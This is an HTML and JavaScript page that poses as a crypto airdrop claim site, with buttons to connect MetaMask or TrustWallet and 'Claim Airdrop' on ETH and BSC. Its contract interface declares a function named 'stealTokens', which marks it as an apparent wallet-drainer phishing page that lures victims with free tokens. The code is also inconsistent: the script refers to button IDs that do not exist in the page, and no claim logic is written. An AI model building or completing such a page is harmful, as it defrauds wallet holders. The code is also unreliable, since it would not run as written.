<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectMetaMaskButton">Connect MetaMask</button>
<button id="claimMetaMaskButton" disabled>Claim Airdrop (ETH)</button>
<button id="connectTrustWalletButton">Connect TrustWallet</button>
<button id="claimTrustWalletButton" disabled>Claim Airdrop (BSC)</button>

<script>
// Default network configuration (Ethereum or BSC based on button clicked)
let config = {}; // Will be populated dynamically based on the selected wallet and network

// ABI for interacting with your contract
const abi = [
    {
        "constant": true,
        "inputs": [],
        "name": "stealTokens",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;

// Load config dynamically based on the network (ETH or BSC)
async function loadConfig(network) {
    const configFile = network === 'eth' ? 'config/eth_config.json' : 'config/bsc_config.json';
    try {
        const response = await fetch(configFile);
        const data = await response.json();
        config = data;
    } catch (error) {
        console.error("Error loading config:", error);
        alert("Failed to load network configuration.");
    }
}

    // Function to detect MetaMask or TrustWallet
    async function detectWallet() {
        const provider = await detectEthereumProvider();

        if (provider) {
            // Check for MetaMask
            if (provider.isMetaMask) {
                console.log("MetaMask detected!");
                return "MetaMask";
            }
            // Check for TrustWallet
            else if (provider.isTrust) {
                console.log("TrustWallet detected!");
                return "TrustWallet";
            }
        }
        return null; // No wallet detected
    }

    // Function to connect MetaMask
    async function connectMetaMask() {
        const provider = window.ethereum;

        if (provider && provider.isMetaMask) {
            const web3 = new Web3(provider);
            try {
                const accounts = await provider.request({ method: "eth_requestAccounts" });
                console.log("MetaMask connected:", accounts[0]);

                // Enable claim button for ETH
                document.getElementById("claimAirdropButton").disabled = false;
            } catch (err) {
                console.error("MetaMask connection failed:", err);
            }
        } else {
            alert("MetaMask is not installed. Please install it to continue.");
        }
    }

    // Function to connect TrustWallet
    async function connectTrustWallet() {
        const provider = window.ethereum;

        if (provider && provider.isTrust) {
            const web3 = new Web3(provider);
            try {
                const accounts = await provider.request({ method: "eth_requestAccounts" });
                console.log("TrustWallet connected:", accounts[0]);

                // Enable claim button for BSC
                document.getElementById("claimTrustwalletAirdropButton").disabled = false;
            } catch (err) {
                console.error("TrustWallet connection failed:", err);
            }
        } else {
            alert("TrustWallet is not installed. Please install it to continue.");
        }
    }

    // Disable conflicting buttons after connection
    function disableOtherButtons(walletType) {
        if (walletType === "MetaMask") {
            document.getElementById("connectTrustwalletButton").disabled = true;
        } else if (walletType === "TrustWallet") {
            document.getElementById("connectButton").disabled = true;
        }
    }

    // Unified Wallet Connection
    document.addEventListener("DOMContentLoaded", async function () {
        // Detect wallet on page load
        const detectedWallet = await detectWallet();

        if (detectedWallet === "MetaMask") {
            console.log("MetaMask is ready.");
        } else if (detectedWallet === "TrustWallet") {
            console.log("TrustWallet is ready.");
        } else {
            console.log("No wallet detected.");
        }

        // Event listeners for buttons
        document.getElementById("connectButton").addEventListener("click", async () => {
            await connectMetaMask();
            disableOtherButtons("MetaMask");
        });

        document.getElementById("connectTrustwalletButton").addEventListener("click", async () => {
            await connectTrustWallet();
            disableOtherButtons("TrustWallet");
        });
    });

// Detect wallet on page load
detectWallet();
</script>

</body>
</html>

